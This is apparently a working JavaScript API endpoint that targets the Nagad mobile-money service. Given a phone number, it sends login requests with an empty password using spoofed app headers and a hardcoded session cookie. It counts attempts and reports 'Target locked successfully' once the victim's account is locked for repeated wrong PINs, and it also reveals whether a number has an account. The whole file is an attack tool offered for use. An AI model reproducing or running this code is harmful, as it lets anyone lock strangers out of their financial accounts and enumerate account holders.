let hitCounts = {}; // Store request counts temporarily

export default async function handler(req, res) {
  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Only GET method is allowed.' });
  }

  const { number } = req.query;

  if (!number || number.length !== 11) {
    return res.status(400).json({ error: 'Please provide a valid 11-digit number.' });
  }

  const url = 'https://app2.mynagad.com:20002/api/login';

  const headers = {
    'Host': 'app2.mynagad.com:20002',
    'User-Agent': 'okhttp/3.14.9',
    'Connection': 'Keep-Alive',
    'Accept-Encoding': 'gzip',
    'Content-Type': 'application/json',
    'X-KM-UserId': '87594060',
    'X-KM-User-MpaId': '17404103407455511125333541230563',
    'X-KM-User-AspId': '100012345612345',
    'X-KM-User-Agent': 'ANDROID/1164',
    'X-KM-Accept-language': 'bn',
    'X-KM-AppCode': '01',
    'Cookie': 'WMONID=-SfYtwZ56xA; JSESSIONID=g2b9KaDZrWj2couoJaX62REkp4_n1cKnbTrpYbGu'
  };

  const body = {
    aspId: '100012345612345',
    mpaId: '',
    password: '',
    username: number
  };

  try {
    const fetch = (await import('node-fetch')).default;
    const response = await fetch(url, {
      method: 'POST',
      headers,
      body: JSON.stringify(body)
    });

    const text = await response.text();

    // Count hits for the number
    hitCounts[number] = (hitCounts[number] || 0) + 1;

    if (text.includes('আপনার কোন নগদ অ্যাকাউন্ট নেই')) {
      return res.json({
        status: 'invalid_number',
        message: 'Invalid Nagad number. Please check and try again.',
        credit: 'Tofazzal Hossain, for DynamicDevX'
      });
    }

    if (text.includes('একাধিকবার ভুল পিন দিয়ে চেষ্টা করার কারণে অ্যাকাউন্টটি লক করা হয়েছে')) {
      if (hitCounts[number] >= 10) {
        return res.json({
          status: 'locked_successful',
          message: 'Target locked successfully.',
          credit: 'Tofazzal Hossain, for DynamicDevX'
        });
      } else {
        return res.json({
          status: 'already_locked',
          message: 'Target is already locked.',
          credit: 'Tofazzal Hossain, for DynamicDevX'
        });
      }
    }

    return res.json({
      status: 'try_again',
      message: 'Please try again later.',
      credit: 'Tofazzal Hossain, for DynamicDevX'
    });

  } catch (error) {
    return res.status(500).json({ error: 'Internal server error.', details: error.message });
  }
      }
